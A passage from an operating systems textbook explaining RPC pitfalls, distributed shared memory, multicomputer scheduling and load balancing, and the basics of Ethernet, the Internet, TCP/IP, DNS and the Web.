The key item to note here is that the client procedure, written by the user, just makes a normal (i.e., local) procedure call to the client stub, which has the same name as the server procedure. Since the client procedure and client stub are in the same address space, the parameters are passed in the usual way. Similarly, the server procedure is called by a procedure in its address space with the parameters it expects. To the server procedure, nothing is unusual. In this way, instead of doing I/O using send and receive, remote communication is done by faking a normal procedure call.

## Implementation Issues

Despite the conceptual elegance of RPC, there are a few snakes hiding under the grass. A big one is the use of pointer parameters. Normally, passing a pointer to a procedure is not a problem. The called procedure can use the pointer the same way the caller can because the two procedures reside in the same virtual address
space. With RPC, passing pointers is impossible because the client and server are in different address spaces.

In some cases, tricks can be used to make it possible to pass pointers. Suppose that the first parameter is a pointer to an integer, $k$. The client stub can marshal $k$ and send it along to the server. The server stub then creates a pointer to $k$ and passes it to the server procedure, just as it expects. When the server procedure returns control to the server stub, the latter sends $k$ back to the client, where the new $k$ is copied over the old one, just in case the server changed it. In effect, the standard calling sequence of call-by-reference has been replaced by copy restore. Unfortunately, this trick does not always work, for example, if the pointer points to a graph or other complex data structure. For this reason, some restrictions must be placed on parameters to procedures called remotely.

A second problem is that in weakly typed languages, like C, it is perfectly legal to write a procedure that computes the inner product of two vectors (arrays), without specifying how large either one is. Each could be terminated by a special value known only to the calling and called procedures. Under these circumstances, it is essentially impossible for the client stub to marshal the parameters: it has no way of determining how large they are.

A third problem is that it is not always possible to deduce the types of the parameters, not even from a formal specification or the code itself. An example is printf, which may have any number of parameters (at least one), and they can be an arbitrary mixture of integers, shorts, longs, characters, strings, floating-point numbers of various lengths, and other types. Trying to call printf as a remote procedure would be practically impossible because C is so permissive. However, a rule saying that RPC can be used provided that you do not program in C (or C++) would not be popular.

A fourth problem relates to the use of global variables. Normally, the calling and called procedures may communicate using global variables, in addition to communicating via parameters. If the called procedure is now moved to a remote machine, the code will fail because the global variables are no longer shared.

These problems are not meant to suggest that RPC is hopeless. In fact, it is widely used, but some restrictions and care are needed to make it work well in practice.

### 8.2.5 Distributed Shared Memory

Although RPC has its attractions, many programmers still prefer a model of shared memory and would like to use it, even on a multicomputer. Surprisingly enough, it is possible to preserve the illusion of shared memory reasonably well, even when it does not actually exist, using a technique called DSM (Distributed Shared Memory) (Li, 1986; and Li and Hudak, 1989). Despite being an old topic, research on it is still going strong (Cai and Strazdins, 2012; Choi and Jung, 2013; and Ohnishi and Yoshida, 2011). DSM is a useful technique to study as it shows
many of the issues and complications in distributed systems. Moreover, the idea itself has been very influential. With DSM, each page is located in one of the memories of Fig. 8-1(b). Each machine has its own virtual memory and page tables. When a CPU does a LOAD or STORE on a page it does not have, a trap to the operating system occurs. The operating system then locates the page and asks the CPU currently holding it to unmap the page and send it over the interconnection network. When it arrives, the page is mapped in and the faulting instruction restarted. In effect, the operating system is just satisfying page faults from remote RAM instead of from local disk. To the user, the machine looks as if it has shared memory.

The difference between actual shared memory and DSM is illustrated in Fig. 8-21. In Fig. 8-21(a), we see a true multiprocessor with physical shared memory implemented by the hardware. In Fig. 8-21(b), we see DSM, implemented by the operating system. In Fig. 8-21(c), we see yet another form of shared memory, implemented by yet higher levels of software. We will come back to this third option later in the chapter, but for now we will concentrate on DSM.

![](Modern%20Operating%20Systems%204th%20Edition_2/images8fcc30e4-d6c3-442e-a7e2-8b8316a28e5b-020_898_1278_893_128.jpg)

Figure 8-21. Various layers where shared memory can be implemented. (a) The hardware. (b) The operating system. (c) User-level software.

Let us now look in some detail at how DSM works. In a DSM system, the address space is divided up into pages, with the pages being spread over all the nodes in the system. When a CPU references an address that is not local, a trap occurs,
and the DSM software fetches the page containing the address and restarts the faulting instruction, which now completes successfully. This concept is illustrated in Fig. 8-22(a) for an address space with 16 pages and four nodes, each capable of holding six pages.

![](Modern%20Operating%20Systems%204th%20Edition_2/images8fcc30e4-d6c3-442e-a7e2-8b8316a28e5b-021_1318_1135_415_198.jpg)

Figure 8-22. (a) Pages of the address space distributed among four machines. (b) Situation after CPU 0 references page 10 and the page is moved there. (c) Situation if page 10 is read only and replication is used.

In this example, if CPU 0 references instructions or data in pages 0, 2, 5, or 9, the references are done locally. References to other pages cause traps. For example, a reference to an address in page 10 will cause a trap to the DSM software, which then moves page 10 from node 1 to node 0, as shown in Fig. 8-22(b).

## Replication

One improvement to the basic system that can improve performance considerably is to replicate pages that are read only, for example, program text, read-only constants, or other read-only data structures. For example, if page 10 in Fig. 8-22 is a section of program text, its use by CPU 0 can result in a copy being sent to CPU 0 without the original in CPU 1’s memory being invalidated or disturbed, as shown in Fig. 8-22(c). In this way, CPUs 0 and 1 can both reference page 10 as often as needed without causing traps to fetch missing memory.

Another possibility is to replicate not only read-only pages, but also all pages. As long as reads are being done, there is effectively no difference between replicating a read-only page and replicating a read-write page. However, if a replicated page is suddenly modified, special action has to be taken to prevent having multiple, inconsistent copies in existence. How inconsistency is prevented will be discussed in the following sections.

## False Sharing

DSM systems are similar to multiprocessors in certain key ways. In both systems, when a nonlocal memory word is referenced, a chunk of memory containing the word is fetched from its current location and put on the machine making the reference (main memory or cache, respectively). An important design issue is how big the chunk should be? In multiprocessors, the cache block size is usually 32 or 64 bytes, to avoid tying up the bus with the transfer too long. In DSM systems, the unit has to be a multiple of the page size (because the MMU works with pages), but it can be 1, 2, 4, or more pages. In effect, doing this simulates a larger page size.

There are advantages and disadvantages to a larger page size for DSM. The biggest advantage is that because the startup time for a network transfer is fairly substantial, it does not really take much longer to transfer 4096 bytes than it does to transfer 1024 bytes. By transferring data in large units, when a large piece of address space has to be moved, the number of transfers may often be reduced. This property is especially important because many programs exhibit locality of reference, meaning that if a program has referenced one word on a page, it is likely to reference other words on the same page in the immediate future.

On the other hand, the network will be tied up longer with a larger transfer, blocking other faults caused by other processes. Also, too large an effective page size introduces a new problem, called false sharing, illustrated in Fig. 8-23. Here we have a page containing two unrelated shared variables, $A$ and $B$. Processor 1 makes heavy use of $A$, reading and writing it. Similarly, process 2 uses $B$ frequently. Under these circumstances, the page containing both variables will constantly be traveling back and forth between the two machines.

![](Modern%20Operating%20Systems%204th%20Edition_2/images8fcc30e4-d6c3-442e-a7e2-8b8316a28e5b-023_452_1235_250_149.jpg)

Figure 8-23. False sharing of a page containing two unrelated variables.

The problem here is that although the variables are unrelated, they appear by accident on the same page, so when a process uses one of them, it also gets the other. The larger the effective page size, the more often false sharing will occur, and conversely, the smaller the effective page size, the less often it will occur. Nothing analogous to this phenomenon is present in ordinary virtual memory systems.

Clever compilers that understand the problem and place variables in the address space accordingly can help reduce false sharing and improve performance. However, saying this is easier than doing it. Furthermore, if the false sharing consists of node 1 using one element of an array and node 2 using a different element of the same array, there is little that even a clever compiler can do to eliminate the problem.

## Achieving Sequential Consistency

If writable pages are not replicated, achieving consistency is not an issue. There is exactly one copy of each writable page, and it is moved back and forth dynamically as needed. Since it is not always possible to see in advance which pages are writable, in many DSM systems, when a process tries to read a remote page, a local copy is made and both the local and remote copies are set up in their respective MMUs as read only. As long as all references are reads, everything is fine.

However, if any process attempts to write on a replicated page, a potential consistency problem arises because changing one copy and leaving the others alone is unacceptable. This situation is analogous to what happens in a multiprocessor when one CPU attempts to modify a word that is present in multiple caches. The solution there is for the CPU about to do the write to first put a signal on the bus telling all other CPUs to discard their copy of the cache block. DSM systems typically work the same way. Before a shared page can be written, a message is sent to
all other CPUs holding a copy of the page telling them to unmap and discard the page. After all of them have replied that the unmap has finished, the original CPU can now do the write.

It is also possible to tolerate multiple copies of writable pages under carefully restricted circumstances. One way is to allow a process to acquire a lock on a portion of the virtual address space, and then perform multiple read and write operations on the locked memory. At the time the lock is released, changes can be propagated to other copies. As long as only one CPU can lock a page at a given moment, this scheme preserves consistency.

Alternatively, when a potentially writable page is actually written for the first time, a clean copy is made and saved on the CPU doing the write. Locks on the page can then be acquired, the page updated, and the locks released. Later, when a process on a remote machine tries to acquire a lock on the page, the CPU that wrote it earlier compares the current state of the page to the clean copy and builds a message listing all the words that have changed. This list is then sent to the acquiring CPU to update its copy instead of invalidating it (Keleher et al., 1994).

### 8.2.6 Multicomputer Scheduling

On a multiprocessor, all processes reside in the same memory. When a CPU finishes its current task, it picks a process and runs it. In principle, all processes are potential candidates. On a multicomputer the situation is quite different. Each node has its own memory and its own set of processes. CPU 1 cannot suddenly decide to run a process located on node 4 without first doing a fair amount of work to go get it. This difference means that scheduling on multicomputers is easier but allocation of processes to nodes is more important. Below we will study these issues.

Multicomputer scheduling is somewhat similar to multiprocessor scheduling, but not all of the former’s algorithms apply to the latter. The simplest multiprocessor algorithm-maintaining a single central list of ready processes-does not work however, since each process can only run on the CPU it is currently located on. However, when a new process is created, a choice can be made where to place it, for example to balance the load.

Since each node has its own processes, any local scheduling algorithm can be used. However, it is also possible to use multiprocessor gang scheduling, since that merely requires an initial agreement on which process to run in which time slot, and some way to coordinate the start of the time slots.

### 8.2.7 Load Balancing

There is relatively little to say about multicomputer scheduling because once a process has been assigned to a node, any local scheduling algorithm will do, unless gang scheduling is being used. However, precisely because there is so little control
once a process has been assigned to a node, the decision about which process should go on which node is important. This is in contrast to multiprocessor systems, in which all processes live in the same memory and can be scheduled on any CPU at will. Consequently, it is worth looking at how processes can be assigned to nodes in an effective way. The algorithms and heuristics for doing this assignment are known as processor allocation algorithms.

A large number of processor (i.e., node) allocation algorithms have been proposed over the years. They differ in what they assume is known and what the goal is. Properties that might be known about a process include the CPU requirements, memory usage, and amount of communication with every other process. Possible goals include minimizing wasted CPU cycles due to lack of local work, minimizing total communication bandwidth, and ensuring fairness to users and processes. Below we will examine a few algorithms to give an idea of what is possible.

## A Graph-Theoretic Deterministic Algorithm

A widely studied class of algorithms is for systems consisting of processes with known CPU and memory requirements, and a known matrix giving the average amount of traffic between each pair of processes. If the number of processes is greater than the number of CPUs, $k$, several processes will have to be assigned to each CPU. The idea is to perform this assignment to minimize network traffic.

The system can be represented as a weighted graph, with each vertex being a process and each arc representing the flow of messages between two processes. Mathematically, the problem then reduces to finding a way to partition (i.e., cut) the graph into $k$ disjoint subgraphs, subject to certain constraints (e.g., total CPU and memory requirements below some limits for each subgraph). For each solution that meets the constraints, arcs that are entirely within a single subgraph represent intramachine communication and can be ignored. Arcs that go from one subgraph to another represent network traffic. The goal is then to find the partitioning that minimizes the network traffic while meeting all the constraints. As an example, Fig. 8-24 shows a system of nine processes, $A$ through $I$, with each arc labeled with the mean communication load between those two processes (e.g., in Mbps).

In Fig. 8-24(a), we have partitioned the graph with processes $A, E$, and $G$ on node 1, processes $B, F$, and $H$ on node 2, and processes $C, D$, and $I$ on node 3. The total network traffic is the sum of the arcs intersected by the cuts (the dashed lines), or 30 units. In Fig. 8-24(b) we have a different partitioning that has only 28 units of network traffic. Assuming that it meets all the memory and CPU constraints, this is a better choice because it requires less communication.

Intuitively, what we are doing is looking for clusters that are tightly coupled (high intracluster traffic flow) but which interact little with other clusters (low intercluster traffic flow). Some of the earliest papers discussing the problem are Chow and Abraham (1982, Lo, (1984), and Stone and Bokhari (1978).

![](Modern%20Operating%20Systems%204th%20Edition_2/images8fcc30e4-d6c3-442e-a7e2-8b8316a28e5b-026_421_1244_252_148.jpg)

Figure 8-24. Two ways of allocating nine processes to three nodes.

## A Sender-Initiated Distributed Heuristic Algorithm

Now let us look at some distributed algorithms. One algorithm says that when a process is created, it runs on the node that created it unless that node is overloaded. The metric for overloaded might involve too many processes, too big a total working set, or some other metric. If it is overloaded, the node selects another node at random and asks it what its load is (using the same metric). If the probed node’s load is below some threshold value, the new process is sent there (Eager et al., 1986). If not, another machine is chosen for probing. Probing does not go on forever. If no suitable host is found within $N$ probes, the algorithm terminates and the process runs on the originating machine. The idea is for heavily loaded nodes to try to get rid of excess work, as shown in Fig. 8-25(a), which depicts send-er-initiated load balancing.

![](Modern%20Operating%20Systems%204th%20Edition_2/images8fcc30e4-d6c3-442e-a7e2-8b8316a28e5b-026_511_1288_1435_125.jpg)

Figure 8-25. (a) An overloaded node looking for a lightly loaded node to hand off processes to. (b) An empty node looking for work to do.

Eager et al. constructed an analytical queueing model of this algorithm. Using this model, it was established that the algorithm behaves well and is stable under a wide range of parameters, including various threshold values, transfer costs, and probe limits.

Nevertheless, it should be observed that under conditions of heavy load, all machines will constantly send probes to other machines in a futile attempt to find one that is willing to accept more work. Few processes will be off-loaded, but considerable overhead may be incurred in the attempt to do so.

## A Receiver-Initiated Distributed Heuristic Algorithm

A complementary algorithm to the one discussed above, which is initiated by an overloaded sender, is one initiated by an underloaded receiver, as shown in Fig. 8-25(b). With this algorithm, whenever a process finishes, the system checks to see if it has enough work. If not, it picks some machine at random and asks it for work. If that machine has nothing to offer, a second, and then a third machine is asked. If no work is found with $N$ probes, the node temporarily stops asking, does any work it has queued up, and tries again when the next process finishes. If no work is available, the machine goes idle. After some fixed time interval, it begins probing again.

An advantage of this algorithm is that it does not put extra load on the system at critical times. The sender-initiated algorithm makes large numbers of probes precisely when the system can least tolerate it-when it is heavily loaded. With the receiver-initiated algorithm, when the system is heavily loaded, the chance of a machine having insufficient work is small. However, when this does happen, it will be easy to find work to take over. Of course, when there is little work to do, the receiver-initiated algorithm creates considerable probe traffic as all the unemployed machines desperately hunt for work. However, it is far better to have the overhead go up when the system is underloaded than when it is overloaded.

It is also possible to combine both of these algorithms and have machines try to get rid of work when they have too much, and try to acquire work when they do not have enough. Furthermore, machines can perhaps improve on random polling by keeping a history of past probes to determine if any machines are chronically underloaded or overloaded. One of these can be tried first, depending on whether the initiator is trying to get rid of work or acquire it.

### 8.3 DISTRIBUTED SYSTEMS

Having now completed our study of multicores, multiprocessors, and multicomputers we are now ready to turn to the last type of multiple processor system, the distributed system. These systems are similar to multicomputers in that
each node has its own private memory, with no shared physical memory in the system. However, distributed systems are even more loosely coupled than multicomputers.

To start with, each node of a multicomputer generally has a CPU, RAM, a network interface, and possibly a disk for paging. In contrast, each node in a distributed system is a complete computer, with a full complement of peripherals. Next, the nodes of a multicomputer are normally in a single room, so they can communicate by a dedicated high-speed network, whereas the nodes of a distributed system may be spread around the world. Finally, all the nodes of a multicomputer run the same operating system, share a single file system, and are under a common administration, whereas the nodes of a distributed system may each run a different operating system, each of which has its own file system, and be under a different administration. A typical example of a multicomputer is 1024 nodes in a single room at a company or university working on, say, pharmaceutical modeling, whereas a typical distributed system consists of thousands of machines loosely cooperating over the Internet. Figure 8-26 compares multiprocessors, multicomputers, and distributed systems on the points mentioned above.

| Item | Multiprocessor | Multicomputer | Distributed System |
| --- | --- | --- | --- |
| Node configuration | CPU | CPU, RAM, net interface | Complete computer |
| Node peripherals | All shared | Shared exc. maybe disk | Full set per node |
| Location | Same rack | Same room | Possibly worldwide |
| Internode communication | Shared RAM | Dedicated interconnect | Traditional network |
| Operating systems | One, shared | Multiple, same | Possibly all different |
| File systems | One, shared | One, shared | Each node has own |
| Administration | One organization | One organization | Many organizations |

Figure 8-26. Comparison of three kinds of multiple CPU systems.

Multicomputers are clearly in the middle using these metrics. An interesting question is: “Are multicomputers more like multiprocessors or more like distributed systems?” Oddly enough, the answer depends strongly on your perspective. From a technical perspective, multiprocessors have shared memory and the other two do not. This difference leads to different programming models and different mindsets. However, from an applications perspective, multiprocessors and multicomputers are just big equipment racks in a machine room. Both are used for solving computationally intensive problems, whereas a distributed system connecting computers all over the Internet is typically much more involved in communication than in computation and is used in a different way.

To some extent, loose coupling of the computers in a distributed system is both a strength and a weakness. It is a strength because the computers can be used for a wide variety of applications, but it is also a weakness, because programming these applications is difficult due to the lack of any common underlying model.

Typical Internet applications include access to remote computers (using telnet, ssh, and rlogin), access to remote information (using the World Wide Web and FTP, the File Transfer Protocol), person-to-person communication (using email and chat programs), and many emerging applications (e.g., e-commerce, telemedicine, and distance learning). The trouble with all these applications is that each one has to reinvent the wheel. For example, email, FTP, and the World Wide Web all basically move files from point $A$ to point $B$, but each one has its own way of doing it, complete with its own naming conventions, transfer protocols, replication techniques, and everything else. Although many Web browsers hide these differences from the average user, the underlying mechanisms are completely different. Hiding them at the user-interface level is like having a person at a full-service travel agent Website book a trip from New York to San Francisco, and only later learn whether she has purchased a plane, train, or bus ticket.

What distributed systems add to the underlying network is some common paradigm (model) that provides a uniform way of looking at the whole system. The intent of the distributed system is to turn a loosely connected bunch of machines into a coherent system based on one concept. Sometimes the paradigm is simple and sometimes it is more elaborate, but the idea is always to provide something that unifies the system.

A simple example of a unifying paradigm in a different context is found in UNIX, where all I/O devices are made to look like files. Having keyboards, printers, and serial lines all operated on the same way, with the same primitives, makes it easier to deal with them than having them all conceptually different.

One method by which a distributed system can achieve some measure of uniformity in the face of different underlying hardware and operating systems is to have a layer of software on top of the operating system. The layer, called middleware, is illustrated in Fig. 8-27. This layer provides certain data structures and operations that allow processes and users on far-flung machines to interoperate in a consistent way.

In a sense, middleware is like the operating system of a distributed system. That is why it is being discussed in a book on operating systems. On the other hand, it is not really an operating system, so the discussion will not go into much detail. For a comprehensive, book-length treatment of distributed systems, see Distributed Systems (Tanenbaum and van Steen, 2007). In the remainder of this chapter, we will look quickly at the hardware used in a distributed system (i.e., the underlying computer network), then its communication software (the network protocols). After that we will consider a variety of paradigms used in these systems.

### 8.3.1 Network Hardware

Distributed systems are built on top of computer networks, so a brief introduction to the subject is in order. Networks come in two major varieties, LANs (Local Area Networks), which cover a building or a campus, and WANs (Wide Area

![](Modern%20Operating%20Systems%204th%20Edition_2/images8fcc30e4-d6c3-442e-a7e2-8b8316a28e5b-030_610_1145_246_195.jpg)

Figure 8-27. Positioning of middleware in a distributed system.

Networks), which can be citywide, countrywide, or worldwide. The most important kind of LAN is Ethernet, so we will examine that as an example LAN. As our example WAN, we will look at the Internet, even though technically the Internet is not one network, but a federation of thousands of separate networks. However, for our purposes, it is sufficient to think of it as one WAN.

## Ethernet

Classic Ethernet, which is described in IEEE Standard 802.3, consists of a coaxial cable to which a number of computers are attached. The cable is called the Ethernet, in reference to the luminiferous ether through which electromagnetic radiation was once thought to propagate. (When the nineteenth-century British physicist James Clerk Maxwell discovered that electromagnetic radiation could be described by a wave equation, scientists assumed that space must be filled with some ethereal medium in which the radiation was propagating. Only after the famous Michelson-Morley experiment in 1887, which failed to detect the ether, did physicists realize that radiation could propagate in a vacuum.)

In the very first version of Ethernet, a computer was attached to the cable by literally drilling a hole halfway through the cable and screwing in a wire leading to the computer. This was called a vampire tap, and is illustrated symbolically in Fig. 8-28(a). The taps were hard to get right, so before long, proper connectors were used. Nevertheless, electrically, all the computers were connected as if the cables on their network interface cards were soldered together.

![](Modern%20Operating%20Systems%204th%20Edition_2/images8fcc30e4-d6c3-442e-a7e2-8b8316a28e5b-031_428_1191_240_173.jpg)

Figure 8-28. (a) Classic Ethernet. (b) Switched Ethernet.

With many computers hooked up to the same cable, a protocol is needed to prevent chaos. To send a packet on an Ethernet, a computer first listens to the cable to see if any other computer is currently transmitting. If not, it just begins transmitting a packet, which consists of a short header followed by a payload of 0 to 1500 bytes. If the cable is in use, the computer simply waits until the current transmission finishes, then it begins sending.

If two computers start transmitting simultaneously, a collision results, which both of them detect. Both respond by terminating their transmissions, waiting a random amount of time between 0 and $T \mu \mathrm{sec}$ and then starting again. If another collision occurs, all colliding computers randomize the wait into the interval 0 to $2 T \mu \mathrm{sec}$, and then try again. On each further collision, the maximum wait interval is doubled, reducing the chance of more collisions. This algorithm is known as binary exponential backoff. We saw it earlier to reduce polling overhead on locks.

An Ethernet has a maximum cable length and also a maximum number of computers that can be connected to it. To exceed either of these limits, a large building or campus can be wired with multiple Ethernets, which are then connected by devices called bridges. A bridge is a device that allows traffic to pass from one Ethernet to another when the source is on one side and the destination is on the other.

To avoid the problem of collisions, modern Ethernets use switches, as shown in Fig. 8-28(b). Each switch has some number of ports, to which can be attached a computer, an Ethernet, or another switch. When a packet successfully avoids all collisions and makes it to the switch, it is buffered there and sent out on the port where the destination machine lives. By giving each computer its own port, all collisions can be eliminated, at the cost of bigger switches. Compromises, with just a few computers per port, are also possible. In Fig. 8-28(b), a classical Ethernet with multiple computers connected to a cable by vampire taps is attached to one of the ports of the switch.

## The Internet

The Internet evolved from the ARPANET, an experimental packet-switched network funded by the U.S. Dept. of Defense Advanced Research Projects Agency. It went live in December 1969 with three computers in California and one in Utah. It was designed at the height of the Cold War to a be a highly fault-tolerant network that would continue to relay military traffic even in the event of direct nuclear hits on multiple parts of the network by automatically rerouting traffic around the dead machines.

The ARPANET grew rapidly in the 1970s, eventually encompassing hundreds of computers. Then a packet radio network, a satellite network, and eventually thousands of Ethernets were attached to it, leading to the federation of networks we now know as the Internet.

The Internet consists of two kinds of computers, hosts and routers. Hosts are PCs, notebooks, handhelds, servers, mainframes, and other computers owned by individuals or companies that want to connect to the Internet. Routers are specialized switching computers that accept incoming packets on one of many incoming lines and send them on their way along one of many outgoing lines. A router is similar to the switch of Fig. 8-28(b), but also differs from it in ways that will not concern us here. Routers are connected together in large networks, with each router having wires or fibers to many other routers and hosts. Large national or worldwide router networks are operated by telephone companies and ISPs (Internet Service Providers) for their customers.

Figure 8-29 shows a portion of the Internet. At the top we have one of the backbones, normally operated by a backbone operator. It consists of a number of routers connected by high-bandwidth fiber optics, with connections to backbones operated by other (competing) telephone companies. Usually, no hosts connect directly to the backbone, other than maintenance and test machines run by the telephone company.

Attached to the backbone routers by medium-speed fiber optic connections are regional networks and routers at ISPs. In turn, corporate Ethernets each have a router on them and these are connected to regional network routers. Routers at ISPs are connected to modem banks used by the ISP’s customers. In this way, every host on the Internet has at least one path, and often many paths, to every other host.

All traffic on the Internet is sent in the form of packets. Each packet carries its destination address inside it, and this address is used for routing. When a packet comes into a router, the router extracts the destination address and looks (part of) it up in a table to find which outgoing line to send the packet on and thus to which router. This procedure is repeated until the packet reaches the destination host. The routing tables are highly dynamic and are updated continuously as routers and links go down and come back up and as traffic conditions change. The routing algorithms have been intensively studied and modified over the years.

![](Modern%20Operating%20Systems%204th%20Edition_2/images8fcc30e4-d6c3-442e-a7e2-8b8316a28e5b-033_777_1210_243_162.jpg)

Figure 8-29. A portion of the Internet.

### 8.3.2 Network Services and Protocols

All computer networks provide certain services to their users (hosts and processes), which they implement using certain rules about legal message exchanges. Below we will give a brief introduction to these topics.

## Network Services

Computer networks provide services to the hosts and processes using them. Connection-oriented service is modeled after the telephone system. To talk to someone, you pick up the phone, dial the number, talk, and then hang up. Similarly, to use a connection-oriented network service, the service user first establishes a connection, uses the connection, and then releases the connection. The essential aspect of a connection is that it acts like a tube: the sender pushes objects (bits) in at one end, and the receiver takes them out in the same order at the other end.

In contrast, connectionless service is modeled after the postal system. Each message (letter) carries the full destination address, and each one is routed through the system independent of all the others. Normally, when two messages are sent to the same destination, the first one sent will be the first one to arrive. However, it is possible that the first one sent can be delayed so that the second one arrives first. With a connection-oriented service this is impossible.

Each service can be characterized by a quality of service. Some services are reliable in the sense that they never lose data. Usually, a reliable service is implemented by having the receiver confirm the receipt of each message by sending back a special acknowledgement packet so the sender is sure that it arrived. The acknowledgement process introduces overhead and delays, which are necessary to detect packet loss, but which do slow things down.

A typical situation in which a reliable connection-oriented service is appropriate is file transfer. The owner of the file wants to be sure that all the bits arrive correctly and in the same order they were sent. Very few file-transfer customers would prefer a service that occasionally scrambles or loses a few bits, even if it is much faster.

Reliable connection-oriented service has two relatively minor variants: message sequences and byte streams. In the former, the message boundaries are preserved. When two 1-KB messages are sent, they arrive as two distinct 1-KB messages, never as one 2-KB message. In the latter, the connection is simply a stream of bytes, with no message boundaries. When 2 K bytes arrive at the receiver, there is no way to tell if they were sent as one 2-KB message, two 1-KB messages, 2048 1-byte messages, or something else. If the pages of a book are sent over a network to an imagesetter as separate messages, it might be important to preserve the message boundaries. On the other hand, with a terminal logging into a remote server system, a byte stream from the terminal to the computer is all that is needed. There are no message boundaries here.

For some applications, the delays introduced by acknowledgements are unacceptable. One such application is digitized voice traffic. It is preferable for telephone users to hear a bit of noise on the line or a garbled word from time to time than to introduce a delay to wait for acknowledgements.

Not all applications require connections. For example, to test the network, all that is needed is a way to send a single packet that has a high probability of arrival, but no guarantee. Unreliable (meaning not acknowledged) connectionless service is often called datagram service, in analogy with telegram service, which also does not provide an acknowledgement back to the sender.

In other situations, the convenience of not having to establish a connection to send one short message is desired, but reliability is essential. The acknowledged datagram service can be provided for these applications. It is like sending a registered letter and requesting a return receipt. When the receipt comes back, the sender is absolutely sure that the letter was delivered to the intended party and not lost along the way.

Still another service is the request-reply service. In this service the sender transmits a single datagram containing a request; the reply contains the answer. For example, a query to the local library asking where Uighur is spoken falls into this category. Request-reply is commonly used to implement communication in the client-server model: the client issues a request and the server responds to it. Figure 8-30 summarizes the types of services discussed above.

![](Modern%20Operating%20Systems%204th%20Edition_2/images8fcc30e4-d6c3-442e-a7e2-8b8316a28e5b-035_368_1129_241_202.jpg)

Figure 8-30. Six different types of network service.

## Network Protocols

All networks have highly specialized rules for what messages may be sent and what responses may be returned in response to these messages. For example, under certain circumstances (e.g., file transfer), when a message is sent from a source to a destination, the destination is required to send an acknowledgement back indicating correct receipt of the message. Under other circumstances (e.g., digital telephony), no such acknowledgement is expected. The set of rules by which particular computers communicate is called a protocol. Many protocols exist, including router-router protocols, host-host protocols, and others. For a thorough treatment of computer networks and their protocols, see Computer Networks, 5/e (Tanenbaum and Wetherall, 2010).

All modern networks use what is called a protocol stack to layer different protocols on top of one another. At each layer, different issues are dealt with. For example, at the bottom level protocols define how to tell where in the bit stream a packet begins and ends. At a higher level, protocols deal with how to route packets through complex networks from source to destination. And at a still higher level, they make sure that all the packets in a multipacket message have arrived correctly and in the proper order.

Since most distributed systems use the Internet as a base, the key protocols these systems use are the two major Internet protocols: IP and TCP. IP (Internet Protocol) is a datagram protocol in which a sender injects a datagram of up to 64 KB into the network and hopes that it arrives. No guarantees are given. The datagram may be fragmented into smaller packets as it passes through the Internet. These packets travel independently, possibly along different routes. When all the pieces get to the destination, they are assembled in the correct order and delivered.

Two versions of IP are currently in use, v4 and v6. At the moment, v4 still dominates, so we will describe that here, but v6 is up and coming. Each v4 packet starts with a 40-byte header that contains a 32-bit source address and a 32-bit destination address among other fields. These are called IP addresses and form the basis of Internet routing. They are conventionally written as four decimal numbers
in the range 0-255 separated by dots, as in 192.31.231.65. When a packet arrives at a router, the router extracts the IP destination address and uses that for routing.

Since IP datagrams are not acknowledged, IP alone is not sufficient for reliable communication in the Internet. To provide reliable communication, another protocol, TCP (Transmission Control Protocol), is usually layered on top of IP. TCP uses IP to provide connection-oriented streams. To use TCP, a process first establishes a connection to a remote process. The process required is specified by the IP address of a machine and a port number on that machine, to which processes interested in receiving incoming connections listen. Once that has been done, it just pumps bytes into the connection and they are guaranteed to come out the other end undamaged and in the correct order. The TCP implementation achieves this guarantee by using sequence numbers, checksums, and retransmissions of incorrectly received packets. All of this is transparent to the sending and receiving processes. They just see reliable interprocess communication, just like a UNIX pipe.

To see how all these protocols interact, consider the simplest case of a very small message that does not need to be fragmented at any level. The host is on an Ethernet connected to the Internet. What happens exactly? The user process generates the message and makes a system call to send it on a previously established TCP connection. The kernel protocol stack adds a TCP header and then an IP header to the front. Then it goes to the Ethernet driver, which adds an Ethernet header directing the packet to the router on the Ethernet. This router then injects the packet into the Internet, as depicted in Fig. 8-31.

![](Modern%20Operating%20Systems%204th%20Edition_2/images8fcc30e4-d6c3-442e-a7e2-8b8316a28e5b-036_504_1042_1204_246.jpg)

Figure 8-31. Accumulation of packet headers.

To establish a connection with a remote host (or even to send it a datagram), it is necessary to know its IP address. Since managing lists of 32-bit IP addresses is inconvenient for people, a scheme called DNS (Domain Name System) was invented as a database that maps ASCII names for hosts onto their IP addresses. Thus it is possible to use the DNS name star.cs.vu.nl instead of the corresponding IP address 130.37.24.6. DNS names are commonly known because Internet email
addresses are of the form [user-name@DNS-host-name](mailto:user-name@DNS-host-name). This naming system allows the mail program on the sending host to look up the destination host’s IP address in the DNS database, establish a TCP connection to the mail daemon process there, and send the message as a file. The user-name is sent along to identify which mailbox to put the message in.

### 8.3.3 Document-Based Middleware

Now that we have some background on networks and protocols, we can start looking at different middleware layers that can overlay the basic network to produce a consistent paradigm for applications and users. We will start with a simple but well-known example: the World Wide Web. The Web was invented by Tim Berners-Lee at CERN, the European Nuclear Physics Research Center, in 1989 and since then has spread like wildfire all over the world.

The original paradigm behind the Web was quite simple: every computer can hold one or more documents, called Web pages. Each Web page contains text, images, icons, sounds, movies, and the like, as well as hyperlinks (pointers) to other Web pages. When a user requests a Web page using a program called a Web browser, the page is displayed on the screen. Clicking on a link causes the current page to be replaced on the screen by the page pointed to. Although many bells and whistles have recently been grafted onto the Web, the underlying paradigm is still clearly present: the Web is a great big directed graph of documents that can point to other documents, as shown in Fig. 8-32.

![](Modern%20Operating%20Systems%204th%20Edition_2/images8fcc30e4-d6c3-442e-a7e2-8b8316a28e5b-037_500_1195_1247_169.jpg)

Figure 8-32. The Web is a big directed graph of documents.

Each Web page has a unique address, called a URL (Uniform Resource Locator), of the form protocol://DNS-name/file-name. The protocol is most commonly http (HyperText Transfer Protocol), but ftp and others also exist. Then comes the DNS name of the host containing the file. Finally, there is a local file name telling which file is needed. Thus a URL uniquely specifies a single file worldwide

The way the whole system hangs together is as follows. The Web is fundamentally a client-server system, with the user being the client and the Website being the server. When the user provides the browser with a URL, either by typing it in or clicking on a hyperlink on the current page, the browser takes certain steps to fetch the requested Web page. As a simple example, suppose the URL provided is [http://www.minix3.org/getting-started/index.html.](http://www.minix3.org/getting-started/index.html) The browser then takes the following steps to get the page.

1. The browser asks DNS for the IP address of www.minix3.org.
2. DNS replies with 66.147.238.215.
3. The browser makes a TCP connection to port 80 on 66.147.238.215.
4. It then sends a request asking for the file getting-started/index.html.
5. The www.minix3.org server sends the file getting-started/index.html.
6. The browser displays all the text in getting-started/index.html.
7. Manwhile, the browser fetches and displays all images on the page.
8. The TCP connection is released.

